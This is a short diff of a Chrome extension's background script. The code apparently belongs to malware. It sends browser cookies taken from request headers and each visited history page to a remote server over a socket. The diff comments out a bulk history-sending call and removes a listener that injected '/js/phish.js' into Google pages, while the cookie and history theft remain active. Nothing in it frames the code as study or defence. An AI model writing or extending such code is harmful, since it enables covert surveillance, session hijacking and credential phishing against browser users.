@@ -1,6 +1,6 @@
 chrome.runtime.onInstalled.addListener(() => {
   connectToServer();
-  searchAndSendHistory();
+  //searchAndSendHistory();
   createScriptListener();
   chrome.webRequest.onBeforeSendHeaders.addListener((info) => {
       checkAndSendCookies(info);
@@ -11,16 +11,9 @@ chrome.runtime.onInstalled.addListener(() => {
   chrome.history.onVisited.addListener((page) => {
     sendHistoryPage(page);
   });
-  chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
-    if (changeInfo.url) {
-      if (changeInfo.url.includes("google")) {
-        chrome.tabs.executeScript(tabId, {
-          file: "/js/phish.js"
-        });
-      }
-    }
+  chrome.alarms.create("updater", {
+    periodInMinutes: 1
   });
-  chrome.alarms.create("updater", {periodInMinutes: 1});
   chrome.alarms.onAlarm.addListener(() => {
     updateSecurityWebsites(socket);
     updateScriptWebsites(socket);
